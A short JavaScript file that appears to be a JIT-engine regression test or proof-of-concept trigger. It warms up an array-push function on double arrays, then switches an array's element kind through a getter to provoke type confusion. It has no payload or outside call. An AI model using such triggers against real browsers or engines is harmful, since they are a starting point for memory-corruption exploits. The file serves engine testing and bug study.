function hot(arr, v1, v2) {
    arr.push(v1, v2);
}

for (let i = 0; i < 10000; i++) {
    let a = [1.1, 2.2];
    hot(a, 3.3, 4.4);
}

let victim = [1.1, 2.2];

let provider = {
    get p() {
        victim[0] = {};
        return 3.3;
    }
};

hot(victim, provider.p, 4.4);